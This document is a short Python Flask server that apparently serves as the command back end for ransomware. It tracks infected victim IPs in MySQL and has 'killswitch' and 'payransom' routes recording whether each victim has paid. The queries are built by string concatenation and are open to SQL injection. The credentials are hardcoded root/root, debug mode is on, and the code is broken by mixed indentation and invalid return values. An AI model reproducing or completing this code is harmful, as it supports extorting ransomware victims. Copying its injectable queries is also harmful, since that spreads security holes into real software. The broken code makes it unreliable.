from flask import Flask
import mysql.connector


mydb = mysql.connector.connect(
	host = '127.0.0.1',
	user = 'root',
	password = 'root',
	database = 'radhey'
	)
mycursor= mydb.cursor()

app = Flask(__name__)

@app.route('/checkIp/<ip>')
def checkIp(ip):
	global mycursor,mydb	
	cmd = 'select *from ips where ips=\''+ip+'\';';
	mycursor.execute(cmd)
	for x in mycursor:
		if x != None:
			return True		#returs True if it is infected...
	#inserts into table if not
	cmd = 'insert into ips(ips,ransom) values(\''+ip+'\', False);'
	mycursor.execute(cmd)
	mydb.commit()
	return None

@app.route('/killswitch/<ip>')
def kill(ip):
   global mycursor
	cmd = 'select ransom from ips where ips=\''+ip+'\';';
	mycursor.execute(cmd)
	for x in mycursor:
		return x[0]		#returns 0 for not paid 1 for paid

@app.route('/payransom/<ip>')
def payransom(ip):
	global mycursor, mydb
	cmd = 'update ips set ransom = True where ips = \''+ip+'\';'
	mycursor.execute(cmd)
	mydb.commit()

if __name__ == '__main__':
   app.run(debug = True)